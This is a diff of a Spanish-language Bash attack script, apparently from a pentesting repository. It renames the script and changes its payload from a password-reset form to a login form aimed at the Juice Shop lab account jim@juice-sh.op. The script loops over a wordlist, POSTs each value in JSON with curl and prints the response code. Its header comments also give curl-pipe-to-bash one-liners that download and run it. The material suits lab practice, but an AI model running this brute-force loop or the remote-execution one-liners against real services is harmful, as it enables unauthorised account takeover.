@@ -9,13 +9,13 @@
 # Script de NiPeGun para inyectar un valor JSON a la fuerza, con method POST, en una API web determinada
 #
 # Ejecución remota con parámetros:
-#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Web-FuerzaBruta-POST.sh | bash -s [URL] [Diccionario]
+#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Web-POST-FuerzaBruta.sh | bash -s [URL] [Diccionario]
 #
 # Ejecución remota como root (para sistemas sin sudo):
-#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Web-FuerzaBruta-POST.sh | sed 's-sudo--g' | bash -s [URL] [Diccionario]
+#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Web-POST-FuerzaBruta.sh | sed 's-sudo--g' | bash -s [URL] [Diccionario]
 #
 # Bajar y editar directamente el archivo en nano
-#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Web-FuerzaBruta-POST.sh | nano -
+#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Web-POST-FuerzaBruta.sh | nano -
 # ----------
 
 # Definir constantes de color
@@ -50,7 +50,7 @@ while IFS= read -r linea; do
   fi
   contador=$((contador + 1))
   # Construir el JSON con el valor inyectado
-  payload=$(printf '{"email":"jim@juice-sh.op","answer":"%s","new":"34erdfCV.","repeat":"34erdfCV."}' "$linea")
+  payload=$(printf '{"user":"jim@juice-sh.op","pass":"%s"}' "$linea")
   # Enviar la petición POST
   codigo_http=$(curl -s -o /dev/null -w "%{http_code}" -X POST -H "Content-Type: application/json" -d "$payload" "$URL")
   echo "Inyección $contador: Valor '$linea' -> Código HTTP $codigo_http"
